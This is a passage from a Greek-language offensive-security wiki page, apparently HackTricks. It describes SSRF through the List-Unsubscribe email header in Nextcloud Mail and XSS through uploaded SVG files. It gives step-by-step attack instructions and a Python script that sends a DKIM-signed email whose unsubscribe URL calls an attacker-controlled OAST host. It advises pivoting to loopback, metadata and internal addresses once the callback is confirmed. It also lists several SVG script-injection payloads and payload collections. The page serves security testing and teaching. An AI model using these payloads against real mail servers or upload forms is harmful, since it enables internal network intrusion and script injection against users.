Ορισμένοι πελάτες, όπως το Nextcloud Mail app, κάνουν proxy την ενέργεια unsubscribe στην πλευρά του διακομιστή: το πάτημα του κουμπιού δίνει εντολή στον διακομιστή να κάνει fetch το παρεχόμενο URL ο ίδιος. Αυτό μετατρέπει την κεφαλίδα σε ένα SSRF primitive, ειδικά όταν οι διαχειριστές ορίζουν `'allow_local_remote_servers' => true` (τεκμηριωμένο στο [HackerOne report 2902856](https://hackerone.com/reports/2902856)), που επιτρέπει αιτήσεις προς loopback και περιοχές RFC1918.

1. Δημιουργήστε ένα email όπου το `List-Unsubscribe` δείχνει σε ένα endpoint ελεγχόμενο από τον επιτιθέμενο (για blind SSRF χρησιμοποιήστε Burp Collaborator / OAST).
2. Κρατήστε το `List-Unsubscribe-Post: List-Unsubscribe=One-Click` ώστε το UI να εμφανίζει κουμπί unsubscribe με ένα κλικ.
3. Ικανοποιήστε τις απαιτήσεις εμπιστοσύνης: το Nextcloud, για παράδειγμα, πραγματοποιεί αιτήσεις HTTPS για unsubscribe μόνο όταν το μήνυμα περνάει DKIM, οπότε ο επιτιθέμενος πρέπει να υπογράψει το email χρησιμοποιώντας ένα domain που ελέγχει.
4. Παραδώστε το μήνυμα σε ένα mailbox που επεξεργάζεται ο στοχευόμενος server και περιμένετε μέχρι ένας χρήστης να πατήσει το κουμπί unsubscribe.
5. Παρατηρήστε το server-side callback στο collaborator endpoint και μετά pivot σε εσωτερικές διευθύνσεις μόλις επιβεβαιωθεί το primitive.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Μήνυμα List-Unsubscribe υπογεγραμμένο με DKIM για δοκιμές SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Σημειώσεις δοκιμών**

- Χρησιμοποιήστε ένα OAST endpoint για να συλλέξετε blind SSRF hits, και στη συνέχεια προσαρμόστε το `List-Unsubscribe` URL ώστε να στοχεύει `http://127.0.0.1:PORT`, τις υπηρεσίες metadata ή άλλους εσωτερικούς hosts μόλις επιβεβαιωθεί το primitive.
- Επειδή το unsubscribe helper συχνά επαναχρησιμοποιεί το ίδιο HTTP stack με την εφαρμογή, κληρονομείτε τις ρυθμίσεις proxy του, τα HTTP verbs και τις επαναγραφές headers, επιτρέποντας περαιτέρω τεχνικές traversal που περιγράφονται στη [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS μεταφόρτωση αρχείων (svg)

Μεταφορτώστε ως εικόνα ένα αρχείο όπως το ακόλουθο (από [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Βρείτε **περισσότερα SVG payloads στο** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Διάφορα JS κόλπα & Σχετικές πληροφορίες


{{#ref}}
other-js-tricks.md
{{#endref}}

## Πόροι XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Αναφορές

- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
